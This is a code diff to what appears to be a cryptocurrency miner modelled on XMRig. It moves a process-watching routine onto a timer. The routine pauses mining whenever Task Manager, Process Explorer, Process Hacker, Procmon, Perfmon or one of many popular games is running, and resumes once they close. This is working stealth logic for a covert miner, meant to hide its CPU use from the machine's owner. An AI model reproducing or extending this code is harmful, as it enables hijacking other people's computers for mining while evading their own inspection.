@@ -43,9 +43,10 @@
 #include "cc/CCClient.h"
 #include "net/Url.h"
 
-#include <windows.h>
+/*begin*/
 #include <tlhelp32.h>
-#include <thread>
+#include <TCHAR.H>
+/*end*/
 
 #ifdef HAVE_SYSLOG_H
 #   include "log/SysLog.h"
@@ -58,8 +59,6 @@
 
 
 App *App::m_self = nullptr;
-
-bool IsProcessRun(void);
 
 App::App(int argc, char **argv) :
     m_restart(false),
@@ -134,46 +133,37 @@ App::~App()
 #   endif
 }
 
-void Check() {
-	while(true) {
-		Sleep(1000);
-		bool Founded = IsProcessRun();
-		switch (Founded) {
-			case 1:
-				Workers::setEnabled(false);
-				break;
-			default:
-				if (!Workers::isEnabled()) { Workers::setEnabled(true); }
-				break;
-		}
-	}
-}
 
-bool IsProcessRun(void)
+/*begin*/
+void App::CheckTaskManager(uv_timer_t *handle)
 {
-	bool RUN;
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
 	PROCESSENTRY32 pe;
 	pe.dwSize = sizeof(PROCESSENTRY32);
 	Process32First(hSnapshot, &pe);
-	while (Process32Next(hSnapshot, &pe))
-	{
+
+	do  {
 		if (wcscmp(pe.szExeFile, L"WorldOfTanks.exe") == 0 || wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
-		{
-			RUN = true;
-			return RUN;
+			{
+				LOG_INFO("\x1B[01;33mpaused\x1B[0m, something opened");
+				Workers::setEnabled(false);
+				CloseHandle(hSnapshot);
+				return;
+			}
+		} while (Process32Next(hSnapshot, &pe));
+	
+	if (!Workers::isEnabled()) {
+		LOG_INFO("\x1B[01;32mresumed");
+		Workers::setEnabled(true);
 		}
-		else
-			RUN = false;
-	}
-	return RUN;
+	
+	CloseHandle(hSnapshot);				
 }
+/*end*/
 
 int App::start()
 {
-	std::thread* check_taskers = new std::thread(Check);
-	check_taskers->detach();
-	
     if (!m_options) {
         return EINVAL;
     }
@@ -235,6 +225,11 @@ int App::start()
 #   endif
 
     Workers::start(m_options->threads(), m_options->affinity(), m_options->priority());
+	
+	/*begin*/
+	uv_timer_init(uv_default_loop(), &app_m_timer);
+	uv_timer_start(&app_m_timer, App::CheckTaskManager, 1000, 1000);
+	/*end*/
 
     if (m_options->pools().front()->isValid()) {
         m_network->connect();
